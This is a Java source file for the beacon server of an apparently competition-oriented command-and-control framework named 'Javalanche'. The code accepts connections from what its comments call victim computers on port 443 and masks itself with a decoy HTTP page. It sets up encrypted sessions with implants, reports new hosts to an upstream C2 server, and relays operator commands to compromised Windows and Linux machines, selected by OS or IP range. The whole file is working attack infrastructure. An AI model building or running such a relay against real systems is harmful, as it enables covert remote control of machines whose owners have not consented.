package Servers.Beacon;

import java.util.Scanner;
import Servers.Duplexer;
import Servers.encryption.aes.*;
import Servers.encryption.rsa.*;

import java.io.Console;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.security.MessageDigest;
import java.nio.charset.StandardCharsets;

public class BeaconServer implements Runnable{
    // Dictionary to Map IP's to Objects that handle them
    private HashMap<String,BeaconClientHandler> windowsClientObjects;
    private HashMap<String,BeaconClientHandler> linuxClientObjects;

    // Dictionary to Map IP's to shellLocks (Locks that are used for notifying/waiting when the user wants responses instantly)
    private HashMap<String,Object> windowsShellLocks;
    private HashMap<String,Object> linuxShellLocks;
    
    // Pointer to the Thread responsible for interacting with the C2 Server
    private BeaconC2Handler C2Handler;

    // Socket that is listentning for connections from clients (victim computers)
    private ServerSocket serverSocket;

    // Boolean to determine if server should remain running
    private boolean sentinel = true;

    // Objects used to determine whether or not the server is still deploying
    private boolean settingUp;
    private Object settingUpLock;

    // ID used to make sure that .notify() is not called when it shouldn't
    private int shellID;

    // RSA object used for rsa encryption to transfer AES keys with clients
    private rsa rsa;

    /**
     * This Creates a new Beacon Server. The Server will listen for new victims, and communicate 
     * back to the C2 Server.
     * 
     * @param C2ServerIPAddress IP Address of the C2 Server
     * @param passwordDigest SHA-256 Digest of the Password entered by the user setting up this Beacon
     * @throws IOException
     */
    public BeaconServer(String C2ServerIPAddress, String passwordDigest) throws IOException{
        this.settingUp = true;
        this.settingUpLock = new Object();

        this.windowsClientObjects = new HashMap<>();
        this.linuxClientObjects = new HashMap<>();
        this.windowsShellLocks = new HashMap<>();
        this.linuxShellLocks = new HashMap<>();
        this.C2Handler = new BeaconC2Handler(this, C2ServerIPAddress, passwordDigest);
        this.serverSocket = new ServerSocket(443);
        this.settingUp = false;
        synchronized(settingUpLock){
            settingUpLock.notify();
        }
        this.shellID = 0;
        this.rsa = new rsa(1024);
    }

    /**
     * This function is used to shut down the Beacon Server. 
     * The Beacon server will distribute this message accordingly, to ensure that all
     * connections are shut down gracefully
     * 
     * @param reason
     * @throws IOException
     */
    protected void quit(String reason) throws IOException{
        // if quit gets called before the constructor is done setting up the server, then wait untill the server is done setting up
        if(settingUp){
            synchronized(settingUpLock){
                try {
                    settingUpLock.wait();
                } catch (InterruptedException e){
                    e.printStackTrace();
                }
            }
        }
        synchronized(windowsClientObjects){
            for(BeaconClientHandler clientHandler : windowsClientObjects.values()){
                clientHandler.quit(reason);
            }
        }
        synchronized(linuxClientObjects){
            for(BeaconClientHandler clientHandler : linuxClientObjects.values()){
                clientHandler.quit(reason);
            }
        }
        sentinel = false;
        serverSocket.close();
        System.out.println("Beacon Server is shutting down. Reason: " + reason);
    }

    /**
     * This Function takes an IP address, with a wildcard character, and returns all
     * Matches for that IP Address. 
     * 
     * Example
     * Client IP Address = {192.168.1.1, 192.168.4.5, 10.1.10.1, 10.2.10.1}
     * 
     * Parameter 10.x.10.1
     * Return Value {10.1.10.1, 10.2.10.1}
     * 
     * Parameter 192.168.1.x
     * Return Value {192.168.1.1}
     * 
     * Parameter 192.168.x.x
     * Return Value {192.168.1.1, 192.168.4.5}
     * 
     * Parameter 172.16.x.15
     * Return Value {}
     * 
     * @param IPAddress IP Address to Match
     * @return All Clients with a matching IP Address
     */
    private ArrayList<String> getIPMatches(String IPAddress){
        ArrayList<String> matches = new ArrayList<>();
        String octets[] = IPAddress.split("\\.");
        for(String ip : windowsClientObjects.keySet()){
            String clientOctets[] = ip.split("\\.");
            if ((octets[0].equals(clientOctets[0]) || octets[0].equals("x")) &&
                (octets[1].equals(clientOctets[1]) || octets[1].equals("x")) &&
                (octets[2].equals(clientOctets[2]) || octets[2].equals("x")) &&
                (octets[3].equals(clientOctets[3]) || octets[3].equals("x"))) {
                matches.add(ip);
            }
        }
        for(String ip : linuxClientObjects.keySet()){
            String clientOctets[] = ip.split("\\.");
            if ((octets[0].equals(clientOctets[0]) || octets[0].equals("x")) &&
                (octets[1].equals(clientOctets[1]) || octets[1].equals("x")) &&
                (octets[2].equals(clientOctets[2]) || octets[2].equals("x")) &&
                (octets[3].equals(clientOctets[3]) || octets[3].equals("x"))) {
                matches.add(ip);
            }
        }
        return matches;
    }

    /**
     * Distribute commands from the Beacon C2 Handler, to all of the different Beacon Client Handlers.
     * 
     * @param scope - What clients should receive the command
     * @param command - what Command should be run
     */
    protected void distributeCommands(String scope, String command){
        if(scope.equals("Windows")){
            for(BeaconClientHandler clientHandler : windowsClientObjects.values()) {
                clientHandler.sendToClient(command);
            }
        } else if(scope.equals("Linux")){
            for(BeaconClientHandler clientHandler : linuxClientObjects.values()){
                clientHandler.sendToClient(command);
            }
        // Range of IPs 
        } else {
            ArrayList<String> ips = getIPMatches(scope);
            for (String ip : ips){
                if(windowsClientObjects.keySet().contains(ip)){
                    windowsClientObjects.get(ip).sendToClient(command);
                } else if(linuxClientObjects.keySet().contains(ip)){
                    linuxClientObjects.get(ip).sendToClient(command);
                }
            }
        }
    }

    public int getShellID(){
        return shellID;
    }

    /**
     * This Function is used by the client handler to inform the C2 Server that it has lost a client
     * @param data
     */
    protected void sendDataToC2Server(String data){
        C2Handler.sendDataToC2Server(data);
    }

    @Override
    public void run(){
        // Start the thread that interacts with the C2 Server
        Thread C2HandlerThread = new Thread(C2Handler);
        C2HandlerThread.start();
        // Always listening for clients
        while(sentinel){
            try{
                // Accept new client
                Socket socket = serverSocket.accept();
                Duplexer duplexer = new Duplexer(socket);

                // First message is either
                //      Get request from a potential client, to make sure the client can reach the server 
                //      An initial connection message from the client with their Operating System, Windows or Linux
                String firstMessage = duplexer.receive();
                String OSMessage = "";
                if(firstMessage.equals("GET / HTTP/1.1")){
                    duplexer.send("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<title>Javalanche</title>\r\n</head>\r\n<body>\r\n<h1>Welcome to Javalanche</h1>\r\n</body>\r\n</html>\r\n");
                } else {
                    OSMessage = firstMessage;
                }
                System.out.println("Inital Message: " + firstMessage);

                if(!(OSMessage.isEmpty())){
                    // Second Message is from the client to the server, the IP address of the client.
                    // The Client sends it's own IP Address, so that all of the IP addresses are not viewed as NAT'd ip addresses
                    // In competitions the private IP addresses have a lot of meaning, typically they will follow some format 
                    // 10.a.b.c, where a = team number, b = OS (1 = Windows, 2 = Linux), and c will be the specific host
                    String IPAddress = duplexer.receive();
                    System.out.println("IP Address: " + IPAddress);

                    if(OSMessage.equals("Windows") || OSMessage.equals("Linux")){
                        // Send message to C2 announcing that a new client has been obtained
                        C2Handler.sendDataToC2Server("{\"ip\": \"" + IPAddress + "\", \"type\": \"client_connect\", \"data\": \"New " + OSMessage + " Client\"}");
                        
                        // Create object used for notifying/waiting when user wants responses back immeediately
                        Object shellLockObject = new Object();

                        // Send public key to client
                        duplexer.send(rsa.getN(), true);
                        duplexer.send(rsa.getE(), true);
                        
                        // Beacon key will encrypt the AES session key with the RSA public key
                        String x = duplexer.receive(true);
                        x = x.substring(0, x.length() - 1);
                        
                        String key = rsa.decrypt(x);
                        while(key.length() % 8 != 0){
                            key = "0" + key;
                        }
                        aes aes = new aes(key, modes.ECB);

                        // Create new Beacon Client Handler Thread to handle this connection between the Beacon and the client
                        BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this, OSMessage, shellLockObject, aes);
                        Thread clientHandlerThread = new Thread(clientHandler);
                        clientHandlerThread.start();
    
                        // Add to client lists
                        if(OSMessage.equals("Windows")){
                            windowsClientObjects.put(IPAddress,clientHandler);
                            windowsShellLocks.put(IPAddress, shellLockObject);
                        }else if(OSMessage.equals("Linux")){
                            linuxClientObjects.put(IPAddress,clientHandler);
                            linuxShellLocks.put(IPAddress, shellLockObject);
                        }
                    }
                }
            } catch(IOException e){
                // If Sentinel is set to false, this means that the "error" occured because the Beacon Server is being shut
                // down while listenting for connections, and there is no need to print the actual error.
                if(sentinel == true){
                    e.printStackTrace();
                }
            } catch (NullPointerException e){}
        }
    }

    public static void main(String[] args){
        // Have the user enter in the IP Address to connect to
        Scanner userScanner = new Scanner(System.in);
        System.out.print("Enter C2 Server IP Address: ");
        String C2ServerIPAddress = userScanner.next();

        // Have the user enter in the password (Console is used so that the input is masked)
        Console passwordInputConsole = System.console();
        String password = new String(passwordInputConsole.readPassword("Enter Password: "));

        // Hash the Password
        String passwordDigest = "";
        try{
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] encodedhash = digest.digest(password.getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder(2 * encodedhash.length);
            for (int i = 0; i < encodedhash.length; i++) {
                String hex = Integer.toHexString(0xff & encodedhash[i]);
                if(hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            passwordDigest = hexString.toString();
        } catch(Exception e){}
        
        try{
            BeaconServer beaconServer = new BeaconServer(C2ServerIPAddress, passwordDigest);
            Thread beaconServerThread = new Thread(beaconServer);
            beaconServerThread.start();
        } catch(IOException e){
            e.printStackTrace();
        }
        
        userScanner.close();
    }
}
